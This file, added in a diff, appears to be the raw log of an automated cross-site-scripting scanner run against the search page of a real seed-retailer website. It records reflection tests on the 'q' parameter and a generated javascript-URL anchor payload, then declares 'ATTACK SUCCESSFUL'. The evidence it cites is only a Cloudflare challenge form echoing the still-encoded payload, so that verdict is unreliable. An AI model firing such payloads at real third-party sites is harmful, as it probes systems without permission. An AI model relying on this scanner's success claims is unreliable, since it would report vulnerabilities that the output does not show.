@@ -1,0 +1,68 @@
+https://www.burpee.com/new/
+
+GET Params:[1]
+['q']
+_______________________________________________________________________________________________________
+https://www.burpee.com/search?q=(uvw"xyz'yxz</zxy
+
+----------------------------------------------------------------------------------
+Attribute Context: [0]
+
+----------------------------------------------------------------------------------
+HTML Context: [3]
+<title>Search Results=(uvw"xyz'yxz</zxy|Burpee Seeds and Plants</title>
+<a class="b-breadcrumbs-keywords_link" href="/search?q=%28uvw%22xyz%27yxz%3C%2Fzxy" title="(uvw&quot;xyz'yxz&lt;/zxy">(uvw&quot;xyz'yxz&lt;/zxy</a>
+<span class="b-no_hits-search_term">
+
+"&#40;uvw&quot;xyz&#39;yxz&lt;/zxy"
+
+</span>
+
+----------------------------------------------------------------------------------
+Script Context: [1]
+<script>
+	adobeCatalyst.data = {"params":{"q":"(uvw&quot;xyz&#39;yxz&lt;/zxy"},"pipeline":"Search-Show"};
+	adobeCatalyst.global = {"name":"","hierarchy":""};
+</script>
+
+----------------------------------------------------------------------------------
+URI Context: [2]
+<a class="b-breadcrumbs-keywords_link" href="/search?q=%28uvw%22xyz%27yxz%3C%2Fzxy" title="(uvw&quot;xyz'yxz&lt;/zxy">
+<meta property="og:title" content="Search Results=(uvw&quot;xyz'yxz&lt;/zxy|Burpee Seeds and Plants" />
+
+----------------------------------------------------------------------------------
+Same Attr : [0]
+
+----------------------------------------------------------------------------------
+Same HTML : [0]
+
+----------------------------------------------------------------------------------
+Same Script : [0]
+
+----------------------------------------------------------------------------------
+Same URI : [0]
+
+
+ENCODING     Presence	"	'	<	( 
+ATTR:		False	False	False	False	False
+ENCODING     Presence	"	'	<	( 
+HTML:		True	True	True	True	True
+
+Attack Payloads for HTML
+[]
+ENCODING     Presence	"	'	<	( 
+SCRIPT:		True	True	True	True	False
+
+Attack Payloads for SCRIPT
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	False	True	False
+
+Attack Payloads for URL
+['%3Ca+href%3D%22jaVaScripT%3AAleRt%281%29%22%3Eclick_XYZ%3C%2Fa%3E']
+
+URL Attack Url: https://www.burpee.com/search?q=%3Ca+href%3D%22jaVaScripT%3AAleRt%281%29%22%3Eclick_XYZ%3C%2Fa%3E
+
+=> ATTACK SUCCESSFUL with Payload: %3Ca+href%3D%22jaVaScripT%3AAleRt%281%29%22%3Eclick_XYZ%3C%2Fa%3E
+Detection of Payload: 
+<form class="challenge-form" id="challenge-form" action="/search?q=%3Ca+href%3D%22jaVaScripT%3AAleRt%281%29%22%3Eclick_XYZ%3C%2Fa%3E&amp;__cf_chl_captcha_tk__=ec68093a6d6649b85daf8de3a64c491cfcd5a336-1586143012-0-AV90PMGmNpBKskkRAsdIgk3YkLnnDRb-gmG-1FZWAFwBzM6QDJyu8YBoowBAaoHN68JRvMfmJ22ojRah7QWi7RxZtIHUaiWTtS19doWuakP4s6cBtpOfIu--VPjbTl6XsX6pNGYFwh_euCkPrPI-Sfidx2EodOy85BAaNzpYoVx7h-YqTRGyxCDPzph2_0rsmmhGai8kF81xLAVheqqcv5nhvC4sQ_V5M8jH_OOy284XHM_5ptoESh3OyUJAl3wUvUhSS2wOl6PpEEN_-DEl_K3_fDVVo1cK5l61kstOzBbhVgAOBs6W65-pbTA38HcViOwFhFdA6NvEqKAd0ajTMRa1JRUVuPkbTssprrMzb4wXQvyrjipr109E3ULvqqMJWv09-JJFX_-c3_edWOiJqeLxxTA4S7PJZ8YVoIEolrR_VV2mDn4jteDkI3Rj2EBq0CXK-J4HRIO3qcF97sDSqbJ4Bo1vKwD1uDOmDOMFAp_CAqGLo3LgCFJ-RwMTCypz05LYSRNbDlU6Da75G5fUaDihNPUX3RNYb7b7wnDS-vkJb7qFjkycqlv6NL2q1dsXGqpG-h3h9jdvEqaPLyqipeA" method="POST" enctype="application/x-www-form-urlencoded">
